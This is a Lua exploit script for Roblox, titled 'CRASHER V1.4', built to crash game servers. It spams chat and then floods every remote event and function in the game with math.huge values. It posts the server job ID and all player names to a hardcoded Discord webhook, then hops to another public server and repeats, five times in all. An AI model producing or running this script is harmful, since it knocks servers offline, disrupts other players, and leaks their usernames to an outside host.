
-- place script in auto execute folder it server hop for more chance of crashing the server (rebooting it)
-- CRASHER V1.4
coroutine.wrap(function()
for i = 1,5 do
  game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("BEWARE SERVER GONNA GET REBOOTED - TEAM HAXA")
end
end)()
task.wait()
local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local JobId = game.JobId
local PlaceId = game.PlaceId
local Players = game:GetService("Players")
local max = math.random(10, 20)
local settings = 4 -- best

for i = 1, 5 do
    -- Start
    for p, v in pairs(game:GetDescendants()) do
        coroutine.wrap(function()
            local success, err = pcall(function()
                if v:IsA("RemoteFunction") then
                    v:InvokeServer(math.huge)
                elseif v:IsA("RemoteEvent") then
                    v:FireServer(math.huge)
                elseif v:IsA("BindableEvent") and v ~= Players.LocalPlayer.PlayerGui.Intro.LocalScript:FindFirstChild("DoTutorial") then
                    v:Fire(game.Players.LocalPlayer, math.huge)
                end
            end)
            if not success then
                warn(":neutral-face: " .. err)
            end
        end)()
    end
    
    wait(settings)
    coroutine.wrap(function()
        local HttpService = game:GetService("HttpService")
        local players = {}
    
        for _, player in ipairs(game.Players:GetPlayers()) do
            table.insert(players, player.Name)
        end
    
        local content = "ðŸš¨ SERVER CRASHED ðŸš¨\n"
        content = content .. "ðŸ†” Job ID: `" .. game.JobId .. "`\n"
        content = content .. "ðŸ‘¥ Players Counts: `" .. tostring(#game.Players:GetPlayers()) .. "`\n"
        content = content .. "ðŸ‘¥ Players: `" .. table.concat(players, ", ") .. "`"
    
        http.request({
            Url = "https://discord.com/api/webhooks/1368622410416263260/Q3d_YET9sxYsnoYvmvnOGtZRR6F8QwrPYeBo-M41UO_qJpteYspR4detWaCy-z-M8zyf",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "@everyone " .. content,
                username = game.Players.LocalPlayer.Name or "Crash Logger"
            })
        })
    end)()
    
    
    -- credit to infinite yield for server hop script
    if httprequest then
        local servers = {}
        local success, req = pcall(function()
            return httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true", PlaceId)})
        end)
        
        if success and req then
            local body = HttpService:JSONDecode(req.Body)
            
            if body and body.data then
                for _, a in pairs(body.data) do
                    if type(a) == "table" and tonumber(a.playing) and tonumber(a.maxPlayers) and a.playing < a.maxPlayers and a.id ~= JobId then
                        table.insert(servers, a.id)
                    end
                end
            end
        else
            warn("error" .. (req or "No response"))
        end
        
        if #servers > 0 then
            local success, err = pcall(function()
                TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
            end)
            if not success then
                warn("failed teleport no httpsync :cold: : " .. err)
            end
        else
            warn("did u crashed all the server? :sweat-smile.")
        end
    end
    -- End
end

